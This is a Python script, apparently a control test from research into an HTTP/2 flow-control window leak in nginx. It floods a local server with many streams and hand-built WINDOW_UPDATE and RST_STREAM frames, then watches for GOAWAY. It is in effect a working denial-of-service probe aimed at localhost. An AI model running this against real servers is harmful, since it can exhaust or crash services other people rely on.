"""Control for the window leak: same load with and without stream cleanup.

Usage: leak_control.py <streams> <0|1 do_reset>

Both runs must end short of MAX (the leak happens either way).  The run with
resets must sit *higher*: ngx_http_v2_filter_cleanup() only walks frames with
`!frame->blocked`, so it returns part of the charged window, never all of it.
"""

import os
import sys

sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)),
                                "_vendor"))

import socket
import ssl
import time

import h2.config
import h2.connection

MAX = 2 ** 31 - 1
N = int(sys.argv[1])
DO_RST = int(sys.argv[2])
PORT = int(sys.argv[3]) if len(sys.argv) > 3 else 18443

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE
ctx.set_alpn_protocols(["h2"])

s = ctx.wrap_socket(socket.create_connection(("127.0.0.1", PORT)),
                    server_hostname="localhost")
s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 1024)

c = h2.connection.H2Connection(
    config=h2.config.H2Configuration(client_side=True))
c.initiate_connection()
c.update_settings({h2.settings.SettingCodes.INITIAL_WINDOW_SIZE: MAX,
                   h2.settings.SettingCodes.MAX_CONCURRENT_STREAMS: 5000})
s.sendall(c.data_to_send())

H = lambda: [(b":method", b"GET"), (b":path", b"/big.bin"),
             (b":scheme", b"https"), (b":authority", b"localhost")]


def wu(inc, sid=0):
    return bytes([0, 0, 4, 0x8, 0]) + sid.to_bytes(4, "big") \
        + inc.to_bytes(4, "big")


s.sendall(wu(MAX - 65535))
time.sleep(0.3)

for i in range(N):
    c.send_headers(3 + 2 * i, H(), end_stream=True)

s.sendall(c.data_to_send())
s.settimeout(0.2)
end = time.time() + 3
while time.time() < end:
    try:
        if not s.recv(65536):
            break
    except Exception:
        pass

if DO_RST:
    for i in range(N - 1):
        try:
            s.sendall(bytes([0, 0, 4, 0x3, 0])
                      + (3 + 2 * i).to_bytes(4, "big") + b"\x00\x00\x00\x00")
        except Exception:
            pass
    time.sleep(1)

try:
    s.sendall(wu(MAX - 65535))
except Exception:
    pass

# drain until GOAWAY or close
buf = b""
s.settimeout(2)
try:
    while True:
        d = s.recv(65536)
        if not d:
            break
        buf += d
        while len(buf) >= 9:
            length = int.from_bytes(buf[:3], "big")
            if len(buf) < 9 + length:
                break
            if buf[3] == 0x7:
                raise SystemExit
            buf = buf[9 + length:]
except Exception:
    pass
